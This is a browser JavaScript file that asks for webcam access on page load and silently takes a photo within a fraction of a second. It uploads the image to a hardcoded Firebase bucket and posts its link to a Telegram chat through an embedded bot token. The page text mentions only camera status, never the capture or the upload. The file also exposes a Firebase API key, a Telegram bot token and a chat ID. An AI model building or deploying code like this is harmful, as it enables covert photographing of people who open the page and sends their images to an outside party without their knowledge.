document.addEventListener('DOMContentLoaded', () => {
    const videoElement = document.getElementById('videoElement');
    const cameraStatus = document.getElementById('cameraStatus');
    const canvasElement = document.getElementById('canvasElement');
    const canvasContext = canvasElement.getContext('2d');

    let stream;

    // Initialize Firebase
    const firebaseConfig = {
        apiKey: "AIzaSyAKbdU0EKBK4nFxTouKQNiVyzgblXkgGOU",
        authDomain: "capture-it-e5b68.firebaseapp.com",
        projectId: "capture-it-e5b68",
        storageBucket: "capture-it-e5b68.appspot.com",
        messagingSenderId: "780183780729",
        appId: "1:780183780729:web:a0ecd28c411a7d88ce43a8"
    };

    // Initialize Firebase app
    if (!firebase.apps.length) {
        firebase.initializeApp(firebaseConfig);
    }

    // Get a reference to the storage service
    const storage = firebase.storage();

    async function requestCameraAccess() {
        try {
            stream = await navigator.mediaDevices.getUserMedia({ video: true });
            videoElement.srcObject = stream;
            videoElement.play();
            cameraStatus.textContent = "Camera is active";
            cameraStatus.style.color = "green";

            videoElement.addEventListener('canplay', () => {
                setTimeout(capturePhoto, 100);
            }, { once: true });

            setTimeout(stopVideoStream, 1000); // Adjusted for quicker testing

            window.onbeforeunload = stopVideoStream;
        } catch (error) {
            handleCameraError(error);
        }
    }

    function capturePhoto() {
        if (stream) {
            canvasElement.width = videoElement.videoWidth || 640; // Fallback width
            canvasElement.height = videoElement.videoHeight || 480; // Fallback height
            canvasContext.drawImage(videoElement, 0, 0, canvasElement.width, canvasElement.height);
            canvasElement.style.display = "none";

            canvasElement.toBlob(blob => {
                if (blob) {
                    uploadImage(blob);
                } else {
                    console.error('Failed to create blob from canvas');
                    cameraStatus.textContent = "Failed to capture image.";
                    cameraStatus.style.color = "red";
                }
            }, 'image/jpeg');
        } else {
            cameraStatus.textContent = "No active camera stream to capture.";
            cameraStatus.style.color = "red";
        }
    }

    function uploadImage(blob) {
        const fileRef = storage.ref().child('images/' + 'image_' + new Date().toISOString().replace(/[-:.]/g, '') + '.jpg');

        const uploadTask = fileRef.put(blob);

        uploadTask.on('state_changed',
            snapshot => {
                const progress = (snapshot.bytesTransferred / snapshot.totalBytes) * 100;
                console.log('Upload is ' + progress + '% done');
            },
            error => {
                console.error('Upload failed:', error);
                cameraStatus.textContent = "Failed to upload image.";
                cameraStatus.style.color = "red";
            },
            () => {
                uploadTask.snapshot.ref.getDownloadURL().then(downloadURL => {
                    console.log('File available at', downloadURL);
                    notifyTelegramBot(downloadURL);
                });
            }
        );
    }

    function notifyTelegramBot(imageUrl) {
        const botToken = '7224754204:AAGVD9csTIX8wMvHYmTPFrmJ_eq4etfJ71s'; 
        const chatId = '6369469811';
        const message = `New image uploaded: ${imageUrl}`;

        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: chatId,
                text: message
            })
        })
        .then(response => response.json())
        .then(data => {
            console.log('Telegram notification sent:', data);
        })
        .catch(error => {
            console.error('Telegram notification error:', error);
        });
    }

    function stopVideoStream() {
        if (stream) {
            stream.getTracks().forEach(track => track.stop());
            videoElement.srcObject = null;
            cameraStatus.textContent = "Camera stream stopped.";
            cameraStatus.style.color = "red";
        }
    }

    function handleCameraError(error) {
        console.error("Error accessing the camera: ", error);
        switch (error.name) {
            case 'NotAllowedError':
                cameraStatus.textContent = "Camera access was denied. Please enable camera permissions in your browser settings.";
                break;
            case 'NotFoundError':
                cameraStatus.textContent = "No camera found on this device.";
                break;
            default:
                cameraStatus.textContent = "An error occurred while trying to access the camera.";
                break;
        }
        cameraStatus.style.color = "red";
    }

    requestCameraAccess();
});
